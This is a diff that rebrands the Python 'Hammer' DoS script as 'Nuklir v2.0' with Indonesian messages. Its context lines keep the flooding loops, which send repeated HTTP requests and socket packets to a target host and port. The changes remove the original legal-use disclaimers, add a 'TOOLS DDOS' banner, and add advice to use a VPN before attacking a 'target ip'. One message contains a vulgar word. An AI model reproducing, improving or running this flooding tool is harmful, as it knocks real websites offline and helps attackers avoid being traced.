@@ -1,9 +1,17 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-
-# python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
-# only for legal purpose
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
+#////                      _   _       _    _ _                            ////
+#////                     | \ | |_   _| | _| (_)_ __                       ////
+#////                     |  \| | | | | |/ / | | '__|                      ////
+#////                     | |\  | |_| |   <| | | |                         ////
+#////                     |_| \_|\__,_|_|\_\_|_|_|                         ////
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
+# Script ini recode dari Hammer
+# python 3.3.2+ Nuklir v2.0
+# by Mr.RLA 0712
 
 
 from queue import Queue
@@ -35,7 +43,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mSedang Men-ddos web...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +57,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Target sedang di serang....--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mBerhenti<->ah\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mServer Has Been Error! Web Telah Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,14 +83,26 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	print (''' \033[91m	
+	<====================================>
+                   TOOLS DDOS DARI
+	     <=============\033[97m=============>
+                     Mr.RLA 0712    
+        <====================================>
+
+
+	\033[92mAttack DARI TOOLS Nuklir
+	PIKIR LAGI....
+
+        • Jangan gunakan script ini sembarangan
+        • Jangan lupa vpn sebelum pake script ini
+  
+	cara pakai : python Serang.py [-s] [-p] [-t]
+	contoh : python3 Serang.py -s \033[93m192.168.0.1 \033[92m-p \033[93m80 \033[92m-t \033[93m135	
+	\033[92m-h : help
+	-s : alamat ip target
+	-p : port target, contoh 80
+	-t : turbo default nya 135 \033[0m''')
 	sys.exit()
 
 
@@ -130,7 +150,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mKakek Sugiono melakukan Pengecekan Kontol...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -139,7 +159,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mKesalahan : Cek lagi ip and port target\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
